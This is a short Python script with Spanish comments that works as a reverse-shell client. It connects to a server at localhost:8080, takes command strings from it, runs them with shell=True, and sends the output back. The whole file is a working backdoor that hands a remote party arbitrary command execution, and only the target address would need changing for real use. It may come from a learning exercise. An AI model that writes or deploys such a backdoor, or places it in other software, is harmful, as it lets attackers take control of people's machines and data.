import socket
import subprocess

cliente = socket.socket()

try:
    # nos conectamos al servidor 
    cliente.connect(("localhost", 8080))
    cliente.send("1".encode("ascii"))

    while True:
        # comando un byte , que se envia al server 
        comando_bytes = cliente.recv(1024)

        # comando decodificado 
        comando_decoficado = comando_bytes.decode("ascii")

        # ejecutar el comando shell
        comando = subprocess.Popen(
            comando_decoficado,
            shell = True,
            stdout= subprocess.PIPE,
            stderr = subprocess.PIPE
        )
        
        # enviar el comando al serv 
        cliente.send(comando.stdout.read())

except Exception as e:
    raise e
